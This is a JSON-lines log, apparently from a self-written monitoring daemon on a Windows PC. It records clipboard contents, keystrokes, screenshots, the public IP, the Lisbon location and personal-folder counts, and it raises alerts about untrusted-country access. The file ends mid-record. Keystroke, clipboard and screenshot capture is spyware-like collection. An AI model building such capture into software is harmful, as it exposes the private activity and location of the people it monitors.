{"timestamp": "2025-06-11T17:28:27.611699+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "def validate_ledger_format():\r\n    if os.path.exists(hash_ledger_path):\r\n        try:\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n            for i, entry in enumerate(ledger):\r\n                if not isinstance(entry, dict) or \"encrypted_file_hash\" not in entry:\r\n                    log_daemon_message(\"WARNING\", f\"Ledger entry at index {i} is invalid or missing 'encrypted_file_hash'.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error reading or validating ledger: {e}\")\r\n", "keystrokes": "[ctrl_l]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (796 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "f0923db051f19fb785ca66d4b3b6dec24b88191eb51baafa3f4cc1503f0dfdb0", "screenshot_hash": "ddbf68d953897fc18b79aebd4732edfc4d1c34a83af31065d269a1339b7cef04", "_raw_log_hash": "35f09122f945efacc6e64b798fd08a8a865b8224fbeb5cb77cf5e11f33beeeaf"}
{"timestamp": "2025-06-11T17:29:55.183733+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (796 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "692791e63ebb3c1c41c685a98bcb91ae40512f4272eac22592100ddbf7a468a8", "screenshot_hash": "2cd5026799fb2d5207b022091627af57b999337441ff5112f1a195f183424722", "_raw_log_hash": "8f4f5be64d775ba995a9455a1b6b7f6f8e9b73df607a37fde4239d6dce0ba3b5"}
{"timestamp": "2025-06-11T17:30:09.493927+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (796 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "692791e63ebb3c1c41c685a98bcb91ae40512f4272eac22592100ddbf7a468a8", "screenshot_hash": "86ce81195179e5e3460a81085a2f7ae659a839060d0e28525013a2feed0bf61e", "_raw_log_hash": "218761a5b001a06b6196741d7f5223c9c731c4d0ab623d6d974f9e3d8dbcdbb8"}
{"timestamp": "2025-06-14T06:32:14.039169+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D090>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5a4b0b8eb269ca3c1ee6944575d97b6d56308b72fe60f78757dcdb2d7dcf60f4", "_raw_log_hash": "d1547f4668c6b1977fb0d8dc132badf9244aa6842572168c0a0079bfedc2874f"}
{"timestamp": "2025-06-14T06:32:28.499069+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EE90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b8318eb1ddff007ce6aa3d7031c61a53bf60f16fbf3db8c87c433cab9d39a5c8", "_raw_log_hash": "e90db7f3b1efa361d386acc866870c70a6f40359b775ce3f50b28188cb9ee3fc"}
{"timestamp": "2025-06-14T06:32:41.975771+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D450>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2e93ca4e4e20ca4bfeebce97477e0155ae86b2db2db9df484a856402431b4d0f", "_raw_log_hash": "9aba72bc4fc6819530aa4e8122813142d35e1f46a518cf0401f1a779e4b3475d"}
{"timestamp": "2025-06-14T06:32:55.585078+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b6d5a1d9487419f58042f1890d91df98eef478208370303428a69e48c5003c70", "_raw_log_hash": "9ae71b4a1835281324ac8fb374d60524652b5fb9c2af5941b8ac5250f32d51db"}
{"timestamp": "2025-06-14T06:33:09.027907+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C7D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "daa85929d5e560dbc088b0aaad419580ebd1874dcd11c4bf7089ac043c9bb0bb", "_raw_log_hash": "068034e4b75ec0c439d32d5eefa3c6006c275a436dc334c762e33bf576bd7af6"}
{"timestamp": "2025-06-14T06:33:22.550370+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fdc9ad57ec5a37051b2c272dcd645b3acbf09a09e5428a1a442b34a376ee1d94", "_raw_log_hash": "b2ba5fe6241917031901be688a26942b0c7b7339a48130bb8e2421071d1f2056"}
{"timestamp": "2025-06-14T06:33:36.162094+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EFD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f862d2095eaf4e7308854d7fcf8ac187223c8567b11fab319f6e8baabeabc3e2", "_raw_log_hash": "1887150dfe00aba9fca2a344e0dd1a1f77d5a8af13e65e1947ef3d3f5423ffdd"}
{"timestamp": "2025-06-14T06:33:49.801712+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "20fb01089e09873c3a10fbc954b51bf3a9ba4a8084153cc58272e985cc8c6a2b", "_raw_log_hash": "5490e44e9fbbf77f7b9cf1b33f7655237ef8459a7955939aa10f44f1ddbe110e"}
{"timestamp": "2025-06-14T06:34:03.308767+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a73fe91150597a9f5ba93ebe1e4aadd2ebe02986b59a823689dd55d97cbaf66d", "_raw_log_hash": "ef821957ba8d5d6cebeddf59254be67a07ac981b3bbd5710fb39f2dc516630a9"}
{"timestamp": "2025-06-14T06:34:16.835486+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CE10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7be3b2204aa2277ba48ff9633d60db555d27bdecc687738c9e211f464830feec", "_raw_log_hash": "5e5d73b8dfc37cd8289fe1ee128704451b5665ba688b62edf6cfaf15dc5088fa"}
{"timestamp": "2025-06-14T06:34:30.309753+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "dcec57fbff4bef7db2f558304a97503fc90bae0b6c1d538228cccd09917db1f4", "_raw_log_hash": "183b9878c1338ecdbbd8b14cece1fda1f568b643f3fa712f08465ca5bc98415c"}
{"timestamp": "2025-06-14T06:34:43.779789+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C7D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e853938b37b2a928ec4710e91bd023f9ef098a4deaf771272cf2a27c2c985544", "_raw_log_hash": "45a74c3e8206aaa5c9b28ace66087a4be7f8364b6990a568f447670a3ae472b5"}
{"timestamp": "2025-06-14T06:34:57.329951+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D1D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "551b4dd1ea233d811a850b6adb1c212208f4bc51af802ec63d79c81ce2191fdf", "_raw_log_hash": "d6bb67b03f003333d83b6dd4649d349c578fb525d84180bb62d4e4078d5f5fa0"}
{"timestamp": "2025-06-14T06:35:10.889017+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "48b69ebcb2dd3689e9342e7bfb6889f90bbbbe6b7e69ac0fc5a373d97456ae46", "_raw_log_hash": "cff174b6c2024d607e323a98eac14988ba76261b6436be4c52fc9a176980c809"}
{"timestamp": "2025-06-14T06:35:24.487156+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EE90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3c9ace044eccf7912efef7383f816c7156a8519ed512c15255cf444c9702a58d", "_raw_log_hash": "3f4aec66a7873cc85b062ae4ff2e7cf5bfb6c3fc5858f53f07dc2f4a71eb1c89"}
{"timestamp": "2025-06-14T06:35:37.944317+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33FD90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "47af4989acaad2071d6db2911a68ad01489b1c60ec3a9cbc8a9e981f87cde011", "_raw_log_hash": "bd3f32c6c01dd066312b07bf79d4a677ed6158dd088d00c64c25a97cf00eb94d"}
{"timestamp": "2025-06-14T06:35:51.524222+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "076647e5da1af24f786de6ee4b9e6eb4a3a6abe82e24fed222ff2e9ff2ba1c92", "_raw_log_hash": "973abe28a0a47f34f7eb0e56c5f2a9be1b21b08377836e7cb8dccbb9ed60d64c"}
{"timestamp": "2025-06-14T06:36:05.125678+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CF50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3678e9b3a2b68979979f3024f782e0db693b3aba7c60ab02134c7fe4af068982", "_raw_log_hash": "a2424918d922888f5a958083097bcf55d56145e61b602c356fa8cac0ab3f98af"}
{"timestamp": "2025-06-14T06:36:18.911647+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C7D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bf502c5e5625829f30eefbdae78be2b59918312a0d9f0a535710a73275c33288", "_raw_log_hash": "b8f5e31008463089011b20da690015164d5c907cbbb994c63934029c0cdcb4cc"}
{"timestamp": "2025-06-14T06:36:32.401461+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33D310>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "84e238af93f5c24929e463a3fe4dd28fdd5e3c8ecee02d18b8ccc69d0762b724", "_raw_log_hash": "b6843be92b6ae552c80ab5b00cfebfe05ff84fa20422ec26321c88e649e6bf26"}
{"timestamp": "2025-06-14T06:36:45.929503+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "79f46a9b22f54762b1311b7c41bbc42cd22ea9fc1515b1f2c7591b3b22875d96", "_raw_log_hash": "d0c30e5b7f43ad61130469059955a099b73ca668b7905577692cd57f69ee7bba"}
{"timestamp": "2025-06-14T06:36:59.472345+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EE90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "915b04930846ba6f86195bdc424799c7cc947024658f0566eafcd79ad9733b8a", "_raw_log_hash": "b206be1d53d335a33e562ca13ebfe2a96a5ea28d3791352107adb0ae20d73bb8"}
{"timestamp": "2025-06-14T06:37:12.951914+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33FD90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": 